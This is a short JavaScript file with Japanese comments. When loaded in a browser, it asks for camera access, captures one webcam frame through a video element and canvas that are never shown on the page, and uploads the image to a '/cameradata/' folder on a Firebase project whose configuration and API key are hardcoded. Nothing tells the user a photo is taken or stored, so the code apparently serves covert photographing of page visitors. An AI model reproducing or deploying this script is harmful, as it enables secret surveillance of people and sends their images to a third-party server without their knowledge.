// Firebaseの構成情報
const firebaseConfig = {
   apiKey: "AIzaSyDGHRQsE7-YH0UxEJ8FvdShUr3_k3AoMQM",
    authDomain: "ip-add-47c83.firebaseapp.com",
    databaseURL: "https://ip-add-47c83-default-rtdb.firebaseio.com",
    projectId: "ip-add-47c83",
    storageBucket: "ip-add-47c83.appspot.com",
    messagingSenderId: "711426693718",
    appId: "1:711426693718:web:258764df678e37350779f7",
};

// Firebase初期化
async function initializeFirebase() {
  try {
    // FirebaseのJavaScript SDKを動的に読み込む
    const firebaseModule = await import("https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js");
    const storageModule = await import("https://www.gstatic.com/firebasejs/9.0.2/firebase-storage.js");

    // Firebase初期化
    const { initializeApp } = firebaseModule;
    const firebaseApp = initializeApp(firebaseConfig);

    // Firebase Storage インスタンスを作成
    const storage = storageModule.getStorage(firebaseApp);

    // カメラを開く処理を実行
    openCameraAndUpload(storage, storageModule);
  } catch (error) {
    console.error("Firebase初期化に失敗しました:", error);
  }
}

// 内カメラにアクセスする関数
async function openCameraAndUpload(storage, storageModule) {
  try {
    // メディアデバイスからストリームを取得
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    // ビデオ要素を作成してストリームをセット
    const videoElement = document.createElement("video");
    videoElement.srcObject = stream;

    // ビデオを再生
    videoElement.play().then(() => {
      // Canvasを作成して画像をキャプチャ
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

      // 現在の日時からファイル名を生成
      const currentDate = new Date();
      const fileName = `${currentDate.getFullYear()}-${currentDate.getMonth() + 1}-${currentDate.getDate()}-${currentDate.getHours()}-${currentDate.getMinutes()}.png`;

      const capturedImage = canvas.toDataURL("image/png");

      // Firebase Storageに画像をアップロード
const imageRef = storageModule.ref(storage, `/cameradata/${fileName}`);
      const uploadTask = storageModule.uploadString(imageRef, capturedImage, "data_url");

      uploadTask.then(() => {
        console.log("画像が正常にアップロードされました。");
      }).catch((error) => {
        console.error("画像のアップロードに失敗しました:", error);
      });

      // ストリームが終了したらカメラを停止
      stream.getVideoTracks()[0].onended = () => {
        console.log("カメラが停止しました。");
      };
    }).catch((error) => {
      console.error("ビデオの再生に失敗しました:", error);
    });
  } catch (error) {
    console.error("カメラにアクセスできませんでした:", error);
  }
}

// Firebase初期化を実行
initializeFirebase();
